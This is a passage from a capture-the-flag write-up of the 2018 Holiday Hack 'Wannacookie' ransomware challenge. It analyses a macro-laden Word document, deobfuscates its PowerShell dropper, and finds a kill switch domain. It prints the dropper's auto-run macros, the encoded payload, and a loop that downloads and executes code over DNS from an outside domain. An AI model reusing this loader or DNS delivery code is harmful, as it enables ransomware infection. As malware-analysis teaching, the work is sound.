OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
===============================================================================
FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
<span style="color: #a020f0;">in</span> file: word/vbaProject.bin - OLE stream: u<span style="color: #8b2252;">'VBA/ThisDocument'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
<span style="color: #a020f0;">in</span> file: word/vbaProject.bin - OLE stream: u<span style="color: #8b2252;">'VBA/Module1'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Dim cmd As String
<span style="color: #a0522d;">cmd</span> = <span style="color: #8b2252;">"powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream(</span>
<span style="color: #8b2252;">[IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIB</span>
<span style="color: #8b2252;">t4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehN</span>
<span style="color: #8b2252;">iQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),</span>
<span style="color: #8b2252;">[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "</span>
Shell cmd
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
<span style="color: #a020f0;">in</span> file: word/vbaProject.bin - OLE stream: u<span style="color: #8b2252;">'VBA/NewMacros'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
Dim cmd As String
<span style="color: #a0522d;">cmd</span> = <span style="color: #8b2252;">"powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream(</span>
<span style="color: #8b2252;">[IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIB</span>
<span style="color: #8b2252;">t4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehN</span>
<span style="color: #8b2252;">iQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),</span>
<span style="color: #8b2252;">[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "</span>
Shell cmd
End Sub

+------------+-----------------+-----------------------------------------+
| Type       | Keyword         | Description                             |
+------------+-----------------+-----------------------------------------+
| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
|            |                 | document is opened                      |
| Suspicious | Shell           | May run an executable file or a system  |
|            |                 | command                                 |
| Suspicious | powershell      | May run PowerShell commands             |
| Suspicious | ExecutionPolicy | May run PowerShell commands             |
| Suspicious | New-Object      | May create an OLE object using          |
|            |                 | PowerShell                              |
| IOC        | powershell.exe  | Executable file name                    |
+------------+-----------------+-----------------------------------------+
</pre>
</div>

<p>
<code>olevba</code> has identified some suspicious macros in our file. We
can see that it's trying to run some commands with Powershell,
but the commands are obfuscated. Following along in Chris's
video, we see many similarities with his example and our
chocolate chip cookie recipe. To deobfuscate this command, we'll remove the <code>iex</code> call (Invoke-Expression), and save the output to <code>dropper.ps1</code>. We'll write this as a script, to make it a bit easier to read:
</p>

<div class="org-src-container">
<pre class="src src-powershell">sal a <span style="color: #0000ff;">New-Object</span>;

<span style="color: #a0522d;">$command</span> = <span style="color: #8b2252;">'lVHRSsMwFP2VSwksYUtoW...REohG'</span>;

(a IO.StreamReader((a IO.Compression.DeflateStream(<span style="color: #228b22;">[IO.MemoryStream][Convert]</span>::FromBase64String(<span style="color: #a0522d;">$command</span>), 
                   <span style="color: #228b22;">[IO.Compression.CompressionMode]</span>::Decompress)),<span style="color: #228b22;">[Text.Encoding]</span>::ASCII)).ReadToEnd() | <span style="color: #0000ff;">Out-File</span> dropper.ps1
</pre>
</div>

<p>
Now we can run it, and verify that we have our file:
</p>

<div class="org-src-container">
<pre class="src src-sh">PS C:\Users\Administrator\Desktop&gt; powershell.exe -ExecutionPolicy Bypass .\cookie_macro.ps1
PS C:\Users\Administrator\Desktop&gt; dir .\dropper.ps1

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2019   9:11 PM            900 dropper.ps1
</pre>
</div>

<p>
Great! Now let's examine <code>dropper.ps1</code>:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #a020f0;">function</span> H2A(<span style="color: #a0522d;">$a</span>) {
    <span style="color: #a0522d;">$o</span>; <span style="color: #a0522d;">$a</span> <span style="color: #483d8b;">-split</span> <span style="color: #8b2252;">'(..)'</span> | ? { <span style="color: #483d8b;">$_</span> }  | <span style="color: #a020f0;">forEach</span> {<span style="color: #228b22;">[char]</span>(<span style="color: #228b22;">[convert]</span>::toint16(<span style="color: #483d8b;">$_</span>,16))} | <span style="color: #a020f0;">forEach</span> {<span style="color: #a0522d;">$o</span> = <span style="color: #a0522d;">$o</span> + <span style="color: #483d8b;">$_</span>};
    <span style="color: #a020f0;">return</span> <span style="color: #a0522d;">$o</span>;
}; 

<span style="color: #a0522d;">$f</span> = <span style="color: #8b2252;">"77616E6E61636F6F6B69652E6D696E2E707331"</span>; 
<span style="color: #a0522d;">$h</span> = <span style="color: #8b2252;">""</span>; 

<span style="color: #a020f0;">foreach</span> (<span style="color: #a0522d;">$i</span> <span style="color: #a020f0;">in</span> 0..(<span style="color: #228b22;">[convert]</span>::ToInt32((<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings, 10)-1)) {
    <span style="color: #a0522d;">$h</span> += (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$i.$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings
}; 
iex($(H2A <span style="color: #a0522d;">$h</span> | <span style="color: #0000ff;">Out-string</span>))
</pre>
</div>

<p>
Even after some cleanup, the code is hard to read, but we clearly see the domain:
</p>

<p>
<b>Answer</b>:
</p>

<div class="note">
<p>
erohetfanu.com
</p>

</div>

<p>
Why&#x2026; that's one of the domains we found in our pre-conference recon! But what does it mean?
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #a020f0;">import</span> codecs
&gt;&gt;&gt; codecs.encode(<span style="color: #8b2252;">'erohetfanu'</span>, <span style="color: #8b2252;">'rot_13'</span>)
<span style="color: #8b2252;">'reburgsnah'</span>
&gt;&gt;&gt; _[::-1]
<span style="color: #8b2252;">'hansgruber'</span>
</pre>
</div>

<p>
Well, if it isn't "hansgruber" backwards, and ROT-13 encoded! That solves one mystery that's been bugging us since before the conference even started!
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgb8dbb31" class="outline-4">
<h4 id="obj93"><a id="orgb8dbb31"></a>Phase 3: Stop the Malware</h4>
<div class="outline-text-4" id="text-obj93">
</div>
<ul class="org-ul">
<li><a id="orgc1601dc"></a>Goal<br />
<div class="outline-text-5" id="text-orgc1601dc">
<div class="note">
<p>
Identify a way to stop the malware in its tracks!
</p>

</div>
</div>
</li>
<li><a id="org43eae07"></a>Background<br />
<ul class="org-ul">
<li><a id="orgfe4f201"></a>Elf Chat<br />
<div class="outline-text-6" id="text-orgfe4f201">
<p>
Shinny told us:
</p>

<blockquote>
<p>
An elf I follow online said he analyzed Wannacookie and that it communicates over DNS.
</p>
</blockquote>

<p>
Alabaster says:
</p>

<blockquote>
<p>
Erohetfanu.com, I wonder what that means? Unfortunately, Snort
alerts show multiple domains, so blocking that one won't be
effective.
</p>

<p>
I remember another ransomware in recent history had a killswitch
domain that, when registered, would prevent any further
infections.
</p>

<p>
Perhaps there is a mechanism like that in this ransomware? Do
some more analysis and see if you can find a fatal flaw and
activate it!
</p>
</blockquote>
</div>
</li>
<li><a id="orgfc48593"></a>Badge Hint<br />
<div class="outline-text-6" id="text-orgfc48593">
<p>
We have a couple of hints from Alabaster:
</p>

<blockquote>
<p>
I think I remember reading an article recently about <a href="https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/">Ransomware Kill Switchs</a>. Wouldn't it be nice if our ransomware had one!
</p>

<p>
<i>wannacookie.min.ps1</i>? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments?
</p>
</blockquote>

<p>
The article tells us:
</p>

<blockquote>
<p>
By relying on a static, discoverable address, whoever found
it—in this case MalwareTech—could just register the domain and
trigger WannaCry's shutdown defense.
</p>
</blockquote>
</div>
</li>
</ul>
</li>
<li><a id="org425f88d"></a>Solution<br />
<div class="outline-text-5" id="text-org425f88d">
<p>
At the end of Phase 2, we recovered a snippet that does something over DNS:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #a0522d;">$f</span> = <span style="color: #8b2252;">"77616E6E61636F6F6B69652E6D696E2E707331"</span>; 

<span style="color: #a020f0;">foreach</span> (<span style="color: #a0522d;">$i</span> <span style="color: #a020f0;">in</span> 0..(<span style="color: #228b22;">[convert]</span>::ToInt32((<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings, 10)-1)) {
    <span style="color: #a0522d;">$h</span> += (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$i.$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings
}; 
</pre>
</div>

<p>
We see that the first DNS query is actually in the <code>foreach</code> line itself:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT
</pre>
</div>

<p>
We expect this to return a number, as it's being convert to a
32-bit integer, as base 10. We recognize
<code>77616E6E61636F6F6B69652E6D696E2E707331</code> from the PCAPs on the
Snort system, and we already found that it's a hex-encoded
"wannacookie.min.ps1". Let's see what's being sent over DNS:
</p>

<div class="org-src-container">
<pre class="src src-sh">PS &gt; $<span style="color: #a0522d;">f</span> = <span style="color: #8b2252;">"77616E6E61636F6F6B69652E6D696E2E707331"</span>;
PS &gt; (Resolve-DnsName -Server erohetfanu.com -Name <span style="color: #8b2252;">"$f.erohetfanu.com"</span> -Type TXT).strings
64
</pre>
</div>

<p>
As expected, the first top-level query returned a number. Next,
the script would start to loop over queries for
<code>0.$f.erohetfanu.com</code>, <code>1.$f.erohetfanu.com</code>, up to the
<code>63.$f.erohetfanu.com</code>. Let's see what those look like:
</p>

<div class="org-src-container">
<pre class="src src-sh">PS &gt; (Resolve-DnsName -Server erohetfanu.com -Name <span style="color: #8b2252;">"0.$f.erohetfanu.com"</span> -Type TXT).strings
2466756e6374696f6e73203d207b66756e6374696f6e20655f645f66696c6528246b65792c202446696c652c2024656e635f69742920
7b5b627974655b5d5d246b6579203d20246b65793b24537566666978203d2022602e77616e6e61636f6f6b6965223b5b53797374656d
2e5265666c656374696f6e2e417373656d626c
</pre>
</div>

<p>
Looks like more encoded content. We notice that the script was passing this output to a function, <code>H2A</code>:
</p>

<div class="org-src-container">
<pre class="src src-powershell">    <span style="color: #a0522d;">$h</span> += (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$i.$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings
}; 
iex($(H2A <span style="color: #a0522d;">$h</span> | <span style="color: #0000ff;">Out-string</span>))
</pre>
</div>

<p>
It would stand to reason that this is once again hex-encoded, and <code>H2A</code> is short for "hex to ASCII."
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt;      <span style="color: #a020f0;">function</span> H2A(<span style="color: #a0522d;">$a</span>) {
&gt;&gt;          <span style="color: #a0522d;">$o</span>; <span style="color: #a0522d;">$a</span> <span style="color: #483d8b;">-split</span> <span style="color: #8b2252;">'(..)'</span> | ? { <span style="color: #483d8b;">$_</span> }  | <span style="color: #a020f0;">forEach</span> {<span style="color: #228b22;">[char]</span>(<span style="color: #228b22;">[convert]</span>::toint16(<span style="color: #483d8b;">$_</span>,16))} | <span style="color: #a020f0;">forEach</span> {<span style="color: #a0522d;">$o</span> = <span style="color: #a0522d;">$o</span> + <span style="color: #483d8b;">$_</span>};
&gt;&gt;          <span style="color: #a020f0;">return</span> <span style="color: #a0522d;">$o</span>;
&gt;&gt;        };
PS &gt; H2A((<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"0.$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings)
<span style="color: #a0522d;">$functions</span> = {<span style="color: #a020f0;">function</span> e_d_file(<span style="color: #a0522d;">$key</span>, <span style="color: #a0522d;">$File</span>, <span style="color: #a0522d;">$enc_it</span>) {[byte[]]<span style="color: #a0522d;">$key</span> = <span style="color: #a0522d;">$key</span>;<span style="color: #a0522d;">$Suffix</span> = <span style="color: #8b2252;">"`.wannacookie"</span>;[System.Reflection.Assembl
</pre>
</div>

<p>
We decoded it, and recovered Powershell code. This was expected,
as <code>Invoke-Expression</code> (<code>iex</code>) executes Powershell code. It seems
as if the 64 queries are simply chunks of the same file. Let's see if we can recover it all:
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #a0522d;">$h</span> = <span style="color: #8b2252;">""</span>;
PS &gt; <span style="color: #a020f0;">foreach</span> (<span style="color: #a0522d;">$i</span> <span style="color: #a020f0;">in</span> 0..63) {
&gt;&gt;       <span style="color: #a0522d;">$h</span> += (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$i.$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings
&gt;&gt;   };
PS &gt; H2A(<span style="color: #a0522d;">$h</span>) | <span style="color: #0000ff;">Out-File</span> wannacookie.min.ps1
PS &gt; dir .\wannacookie.min.ps1

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2019   9:43 PM          16034 wannacookie.min.ps1
</pre>
</div>

<p>
Inspecting the file, it looks like we've managed to download the entire file, just over DNS.
</p>

<div class="warning">
<p>
Hans seems to have setup his DNS server to make life a bit harder
for security researchers, as by default, the queries only work
from Windows clients. Chris suggests modifying the attacker's
code whenever possible, and not following his advice bit us. Many
Linux DNS query tools default to using Extended DNS options
(EDNS), which is needed to support DNSSEC. When querying from a
tool such as <code>dig</code>, we needed to add the <code>+noedns</code> option in
order to get a reply.
</p>

</div>

<p>
Alabaster hints at there being a non-minified version of the file.
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #8b2252;">'wannacookie.ps1'</span> | <span style="color: #0000ff;">Format-Hex</span>

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   77 61 6E 6E 61 63 6F 6F 6B 69 65 2E 70 73 31     wannacookie.ps1
PS &gt; <span style="color: #a0522d;">$f</span> = <span style="color: #8b2252;">'77616e6e61636f6f6b69652e707331'</span>;
PS &gt; (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings
84
PS &gt; <span style="color: #a0522d;">$h</span> = <span style="color: #8b2252;">''</span>;
PS &gt;      <span style="color: #a020f0;">foreach</span> (<span style="color: #a0522d;">$i</span> <span style="color: #a020f0;">in</span> 0..(<span style="color: #228b22;">[convert]</span>::ToInt32((<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings, 10)-1)) {
&gt;&gt;          <span style="color: #a0522d;">$h</span> += (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$i.$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).strings
&gt;&gt;      };
&gt;&gt;
PS &gt; H2A(<span style="color: #a0522d;">$h</span>) | <span style="color: #0000ff;">Out-File</span> wannacookie.ps1
PS &gt; dir .\wannacookie.*

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2019   9:43 PM          16034 wannacookie.min.ps1
-a----        1/13/2019  11:28 PM          21090 wannacookie.ps1
</pre>
</div>

<p>
We successfully recovered a file, which is larger than the
minified version. Let's start investigating it. There's a lot
going on here, with several functions. We can infer a lot just
from the function names, and what system calls the functions
make:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Function Name</th>
<th scope="col" class="org-left">Purpose</th>
<th scope="col" class="org-left">Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Enc_Dec-File</td>
<td class="org-left">Encrypt/Decrypt file?</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">H2B</td>
<td class="org-left">Hex to something ?</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">A2H</td>
<td class="org-left">ASCII to Hex</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">H2A</td>
<td class="org-left">Hex to ASCII</td>
<td class="org-left">Matches the dropper H2A</td>
</tr>

<tr>
<td class="org-left">B2H</td>
<td class="org-left">Something to Hex ? (Inverse of H2B?)</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">ti_rox</td>
<td class="org-left">XOR</td>
<td class="org-left">This is "xor_it" backwards!</td>
</tr>

<tr>
<td class="org-left">B2G</td>
<td class="org-left">GZIP compress</td>
<td class="org-left">Calls GzipStream with Compress</td>
</tr>

<tr>
<td class="org-left">G2B</td>
<td class="org-left">GZIP decompress</td>
<td class="org-left">Calls GzipStream with Decompress</td>
</tr>

<tr>
<td class="org-left">Sha1</td>
<td class="org-left">SHA1 Hash</td>
<td class="org-left">Calls SHA1 ComputeHash</td>
</tr>

<tr>
<td class="org-left">Pub_Key_Enc</td>
<td class="org-left">Encrypt with X509 Public Key</td>
<td class="org-left">Calls PublicKey Encrypt</td>
</tr>

<tr>
<td class="org-left">get_over_dns</td>
<td class="org-left">Download a file over DNS</td>
<td class="org-left">Matches code in the dropper</td>
</tr>

<tr>
<td class="org-left">wannacookie</td>
<td class="org-left">Main function?</td>
<td class="org-left">Calls most other functions</td>
</tr>
</tbody>
</table>

<p>
Again, Chris suggests just adapting this code to investigate it,
rather than trying to replicate it ourselves. Before we make any
changes, though, we'll make sure to backup the original file.
</p>

<p>
At the very bottom of the file, we see that the file calls
<code>wannacookie</code>. We can comment out that line, and now we can load
the file without anything executing. We're also working in an
isolated virtual machine, just in case we pull an Alabaster. Once
the file is loaded, we'll start going through the logic of the
<code>wannacookie</code> function, slowly enough so as to understand what
each component does:
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #0000ff;">Import-Module</span> .\wannacookie_defused.ps1
PS &gt; <span style="color: #a0522d;">$S1</span> = <span style="color: #8b2252;">"1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"</span>
</pre>
</div>

<p>
However, very quickly we reach a line that's difficult to
understand. It looks like it's doing a DNS query, but what it's
actually querying is very difficult to parse. Tracing these
parentheses is almost as difficult as in Lisp! Reading the line
carefully, we see that it's doing two DNS TXT queries. One is
trivial to rerun:
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #a0522d;">$inner_query</span> = $(<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> 6B696C6C737769746368.erohetfanu.com <span style="color: #008b8b;">-Type</span> TXT).Strings;

PS &gt; <span style="color: #a0522d;">$inner_query</span>
66667272727869657268667865666B73
PS &gt; H2A(<span style="color: #a0522d;">$inner_query</span>);
ffrrrxierhfxefks
</pre>
</div>

<p>
Still obfuscated. But what is the domain it's trying?
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; H2A <span style="color: #8b2252;">"6B696C6C737769746368"</span>
killswitch
</pre>
</div>

<p>
We're on the right track! We can now continue untangling this line, as we work our way out:
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #a0522d;">$xor_result</span> = $(B2H $(ti_rox $(B2H $(G2B $(H2B <span style="color: #a0522d;">$S1</span>))) <span style="color: #a0522d;">$inner_query</span>))

PS &gt; <span style="color: #a0522d;">$xor_result</span>
7969707065656b697961612e61616179
PS &gt; $(H2A <span style="color: #a0522d;">$xor_result</span>)
yippeekiyaa.aaay
</pre>
</div>

<p>
Our line now looks like:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #a020f0;">if</span> ( <span style="color: #483d8b;">$null</span> <span style="color: #483d8b;">-ne</span> (<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"yippeekiyaa.aaay"</span> <span style="color: #008b8b;">-ErrorAction</span> 0 <span style="color: #008b8b;">-Server</span> 8.8.8.8) ) {
    <span style="color: #a020f0;">return</span>
} 
</pre>
</div>

<p>
So, this code tries to lookup "yippeekiyaa.aaay" via Google's
8.8.8.8 DNS server. If it gets a result, it just returns. We seem
to have found our kill switch. The WannaCry article discussed how
a researcher registered the killswitch domain in order to stop it
in its tracks. We've also noticed the "HoHoHoDaddy" terminal,
which brings up a domain registration page. If we enter our domain, we get:
</p>


<div class="figure">
<p><img src="./imgs/obj9_killswitch.png" alt="obj9_killswitch.png" width="750px" />
</p>
<p><span class="figure-number">Figure 56: </span>Killswitch registered</p>
</div>

<p>
<b>Answer</b>:
</p>

<div class="note">
<p>
yippeekiyaa.aaay
</p>

</div>
</div>
</li>
</ul>
</div>
<div id="outline-container-org882c9dd" class="outline-4">
<h4 id="obj94"><a id="org882c9dd"></a>Phase 4: Recover Alabaster's Password</h4>
<div class="outline-text-4" id="text-obj94">
</div>
<ul class="org-ul">
<li><a id="orge17ad57"></a>Goal<br />
<div class="outline-text-5" id="text-orge17ad57">
<div class="note">
<p>
Recover Alabaster's password as found in the the encrypted password vault.
</p>

</div>
</div>
</li>
<li><a id="org1f54da6"></a>Background<br />
<ul class="org-ul">
<li><a id="org898d8b6"></a>Elf Chat<br />
<div class="outline-text-6" id="text-org898d8b6">
<p>
Alabaster says:
</p>

<blockquote>
<p>
Yippee-Ki-Yay! Now, I have a ma&#x2026; kill-switch!
</p>

<p>
Now that we don't have to worry about new infections, I could sure use your L337 security skills for one last thing.
</p>

<p>
As I mentioned, I made the mistake of analyzing the malware on my host computer and the ransomware encrypted my password database.
</p>

<p>
Take this <a href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">zip</a> with a memory dump and my encrypted password database, and see if you can recover my passwords.
</p>

<p>
One of the passwords will unlock our access to the vault so we can get in before the hackers.
</p>
</blockquote>

<p>
We also have the following hints from Shinny:
</p>

<blockquote>
<p>
He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way.
</p>

<p>
Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie!
</p>

<p>
Of course, this all depends how the key was encrypted and
managed in memory. Proper public key encryption requires a
private key to decrypt.
</p>

<p>
Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need.
</p>

<p>
If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.
</p>
</blockquote>
</div>
</li>
<li><a id="orgc0354d8"></a>Badge Hint<br />
<div class="outline-text-6" id="text-orgc0354d8">
<p>
We have a hint that we haven't used yet:
</p>

<blockquote>
<p>
Pulling strings from a memory dump using the linux strings
command requires you specify the -e option with the specific
format required by the OS and processor. Of course, you could
also use <a href="https://github.com/chrisjd20/power_dump">powerdump</a>.
</p>
</blockquote>
</div>
</li>
</ul>
</li>
<li><a id="orgfbc7e86"></a>Solution<br />
<div class="outline-text-5" id="text-orgfbc7e86">
<p>
Opening the zip reveals two files:
<code>alabaster_passwords.elfdb.wannacookie</code> and
<code>powershell.exe_181109_104716.dmp</code>. To solve this, we really need
to understand the Powershell script better. After some analysis,
we can trace the main code flow:
</p>


<div class="figure">
<p><img src="./imgs/obj9_flowchart.png" alt="obj9_flowchart.png" />
</p>
<p><span class="figure-number">Figure 57: </span>WannaCookie Flowchart</p>
</div>

<p>
At this point, Shinny's hints make more sense. We observe the
malware grabbing a public key over DNS (<code>pub_key</code>). The files are
then encrypted with a different, random encryption key
(<code>Byte_key</code> and <code>Hex_key</code>). Unfortunately, <code>Byte_key</code> and
<code>Hex_key</code> are cleared from memory, so we likely won't be able to
find them in the memory dump. We notice that <code>Byte_key</code> is
encrypted with <code>pub_key</code> and uploaded over DNS. Shinny's hint
tells us that to decrypt the encrypted <code>Byte_key</code>, we need the
private key.
</p>

<p>
The public key was downloaded over DNS with the filename
"server.crt". The Packalyzer also had a "server.crt" key, and its
private key was stored in "server.key." Let's see if the malware
author left that key sitting around:
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #a0522d;">$f</span> = $(A2H <span style="color: #8b2252;">"server.key"</span>)

PS &gt; $(<span style="color: #0000ff;">Resolve-DnsName</span> <span style="color: #008b8b;">-Server</span> erohetfanu.com <span style="color: #008b8b;">-Name</span> <span style="color: #8b2252;">"$f.erohetfanu.com"</span> <span style="color: #008b8b;">-Type</span> TXT).Strings
14

PS &gt; get_over_dns(<span style="color: #a0522d;">$f</span>) | <span style="color: #0000ff;">Out-File</span> <span style="color: #8b2252;">"server.key"</span>

PS &gt; dir .\server.key

Mode                LastWriteTime         Length Name                                                                                                                    
----                -------------         ------ ----                                                                                                                    
-a----        1/14/2019   2:59 AM           3470 server.key 
</pre>
</div>

<p>
Now that we have the private key, we need to recover the
encrypted <code>Byte_key</code>. Before we can find it, we need to know the
format it's in. Once again, we'll just execute some of the
malware's code:
</p>

<div class="org-src-container">
<pre class="src src-powershell">PS &gt; <span style="color: #a0522d;">$pub_key</span> = <span style="color: #228b22;">[System.Convert]</span>::FromBase64String($(get_over_dns(<span style="color: #8b2252;">"7365727665722E637274"</span>) ) )
PS &gt; <span style="color: #a0522d;">$Byte_key</span> = (<span style="color: #228b22;">[System.Text.Encoding]</span>::Unicode.GetBytes($(([char[]](<span style="color: #228b22;">[char]</span>01..<span style="color: #228b22;">[char]</span>255) + ([char[]](<span style="color: #228b22;">[char]</span>01..<span style="color: #228b22;">[char]</span>255)) + 0..9 | sort {<span style="color: #0000ff;">Get-Random</span>})[0..15] <span style="color: #483d8b;">-join</span> <span style="color: #8b2252;">''</span>))  | ? {<span style="color: #483d8b;">$_</span> <span style="color: #483d8b;">-ne</span> 0x00})
PS &gt; <span style="color: #a0522d;">$Hex_key</span> = $(B2H <span style="color: #a0522d;">$Byte_key</span>)
PS &gt; <span style="color: #a0522d;">$Pub_key_encrypted_Key</span> = (Pub_Key_Enc <span style="color: #a0522d;">$Byte_key</span> <span style="color: #a0522d;">$pub_key</span>).ToString()
PS &gt; <span style="color: #a0522d;">$Pub_key_encrypted_Key</span>
b2e41690920bef3262600cd0314fc4cf7213bddd113d7097a64f3097fbc4186029c0e3f3f132ac9e0d957899fd97e609
b60d405ba643bcc639cd640301dcc03c6c94aa279d1fe040f51cb9ac17cdcf0cede7cdd228674ab350a1f3441b2e39bc
aa29c8d1bc33dd816a3d1b97adf6f3e725640af2fa9a8298968e3d255744a238b68f41928bf642ace04d64226e449e77
9a99bb4b4e8fd6625f4e022b9d5a16115ce7e74515c03f394c7a57fc37e29269b010f3d68588e83f1084b04c3800a26c
